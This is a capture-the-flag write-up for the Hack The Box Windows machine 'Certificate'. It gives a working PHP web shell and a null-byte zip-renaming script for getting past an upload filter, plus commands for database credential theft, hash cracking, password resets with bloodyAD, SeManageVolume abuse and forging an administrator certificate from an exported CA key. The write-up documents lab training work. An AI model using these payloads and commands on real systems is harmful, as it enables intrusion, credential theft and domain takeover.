```json
Alias: Certificate
Date: 03-06_2025
Platform: Hackthebox
OS: Windows
Difficulty: Hard
Status: Complete
IP: 10.10.11.71
```

# Certificate
# Summary

- File Upload Vulnerability -> Account Operators Group -> SeManageVolumePrivileges

# Lessons Learnt

* Think harder
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-03 17:18 PKT
Nmap scan report for 10.10.11.71
Host is up (0.16s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
|_http-title: Did not follow redirect to http://certificate.htb/
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-03 20:18:29Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
|_ssl-date: 2025-06-03T20:19:53+00:00; +8h00m00s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
|_ssl-date: 2025-06-03T20:19:54+00:00; +8h00m00s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
|_ssl-date: 2025-06-03T20:19:53+00:00; +8h00m00s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-03T20:19:54+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
| smb2-time:
|   date: 2025-06-03T20:19:17
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.62 seconds
```
## Discovered Subdomains
```
certificate.htb
DC01.certificate.htb
```

---
# Enumeration

After registering a student account and logging in, we can enroll in a course and find out that we can submit files for quizzes. At the following endpoint: `http://certificate.htb/upload.php?s_id=5` a lot of the s_ids won't work.

Even with these, it wouldn't directly open, I had to make the get request with burpsuite then view in browser. For the file upload, if we mess around with it enough, we find out that it takes zip files and extracts them. With the problem being that it then deletes them right after, so we can't get code execution. To bypass this we create a zip file named `web_shell.zip` that contains the file `web_shell.php` which has the following contents

```php
%PDF-<?=
system($_GET["cmd"])
?>
```

then, execute this python script

```py
import zipfile

zip_path = 'web_shell.zip'
new_zip_path = 'web_shell2.zip'
old_filename = 'web_shell.php'
new_filename = 'web_shell.php\x00.pdf'

with zipfile.ZipFile(zip_path, 'r') as zip_read:
    with zipfile.ZipFile(new_zip_path, 'w') as zip_write:
        for item in zip_read.infolist():
            original_data = zip_read.read(item.filename)
            item.filename = new_filename
            zip_write.writestr(item, original_data)

```

It creates a file named `web_shell2.zip`, upload that and navigate to the upload directory it returns + `/web_shell.php?cmd=whoami`. This works because it takes the `web_shell.php` in the original zip and changes it's name to `web_shell.php\x00.pdf`. When the file is created in the file system, Windows ignores everything after `\0` the null byte.

and when the cleanup script tries to delete `web_shell.php\x00.pdf`, the file isn't found as it's name is `web_shell.php`


---

# Exploitation

After getting a shell, we can get the db password from `db.php`

```php
$db_user = 'certificate_webapp_user'; // Change to your DB username
$db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
```

Lets list the registered users

```bash
C:\xampp\mysql\bin\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "SELECT * FROM users" Certificate_WEBAPP_DB
```

| id  | first_name | last_name | username   | email                   | password                                                                 | created_at          | role    | is_active |
|-----|------------|-----------|------------|--------------------------|--------------------------------------------------------------------------|----------------------|---------|-----------|
| 1   | Lorra      | Armessa   | Lorra.AAA  | lorra.aaa@certificate.htb | `$2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG`             | 2024-12-23 12:43:10 | teacher | 1         |
| 6   | Sara       | Laracrof  | Sara1200   | sara1200@gmail.com       | `$2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK`             | 2024-12-23 12:47:11 | teacher | 1         |
| 7   | John       | Wood      | Johney     | johny009@mail.com        | `$2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq`             | 2024-12-23 13:18:18 | student | 1         |
| 8   | Havok      | Watterson | havokww    | havokww@hotmail.com      | `$2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti`             | 2024-12-24 09:08:04 | teacher | 1         |
| 9   | Steven     | Roman     | stev       | steven@yahoo.com         | `$2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2`             | 2024-12-24 12:05:05 | student | 1         |
| 10  | Sara       | Brawn     | sara.b     | sara.b@certificate.htb   | `$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6`             | 2024-12-25 21:31:26 | admin   | 1         |
| 12  | 0xfa11     | 0xfa11    | 0xfa11     | 0xfa11@certificate.htb   | `$2y$04$8NGelPn5ij8cTicdV9EKauiFBUnw1ISiV5z.WCEHe1mUtDdU7.1X2`             | 2025-06-03 14:36:47 | student | 1         |

```bash
hashcat -m 3200 web_hashes ~/Documents/Wordlists/rockyou.txt
```

We get:

| Username | Password |
| -------- | -------- |
| sara.b   | Blink182 |
We can finally authenticate to AD and can winrm!



---

# Lateral Movement

With a little enumeration in bloodhound, we find out that `sara.b` is a member of `Account Operators`. Which can

- Log on locally to domain controllers (no local admin by default)
- Modify Local and Global groups besides the protected groups (Administrators, Server Operators, Account Operators, Backup Operators, or Print Operators groups)
- Modify user accounts including updating passwords (besides members of the protected groups)

So with this, I started looking for other interesting non-admin users. I found `ryan.k` who is a part of `Remote Management Users` (Can `PSRemote`) and `Domain Storage Managers` who's description states: `The members of this security group are responsible for volume-level tasks such as maintaining, defragmenting and managing partitions and disks.`

Looks interesting, so let's try to get access to `ryan.k`

```bash
bloodyAD --host dc01.certificate.htb -u 'sara.b' -p 'Blink182' --dc-ip $IP -d certificate.htb set password ryan.k 'P@ssw0rd!23'
```

| Username | Password    |
| -------- | ----------- |
| ryan.k   | P@ssw0rd!23 |


---

# Privilege Escalation

![[Pasted image 20250603203833.png]]

We have 2 interesting privileges as `ryan.k`. Here we will be abusing `SeManageVolumePrivilege` to grant all users full permissions to the entire C: drive. This does just that https://github.com/CsEnox/SeManageVolumeExploit

Download the `exe` from releases, transfer and run it.

![[Pasted image 20250603205007.png]]

Normally, we could right now read `root.txt` but it's not allowing us to do that here. Probably a script designed for the CTF. We can instead export the certificate for a local root CA `Certificat-LTD-CA`

```bash
certutil -exportPFX "Certificate-LTD-CA" ca.pfx
```

With the private key of this cert, we can basically just create and sign arbitrary certs for any user including administrator, download the file and use https://github.com/Ridter/pyForgeCert

```bash
python ~/opt/pyForgeCert/pyForgeCert.py -i ca.pfx -o admin.pfx -pfx
```

```bash
certipy auth -dc-ip $IP -pfx admin.pfx -username administrator -domain certificate.htb -password sFdiIwnX
```

```
Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
```




---

# Flags
- 00480f10691a91367308a0d9705d2226
- 3c672fd9ca9c94a81ac7fe8eb17c48ac

#CTF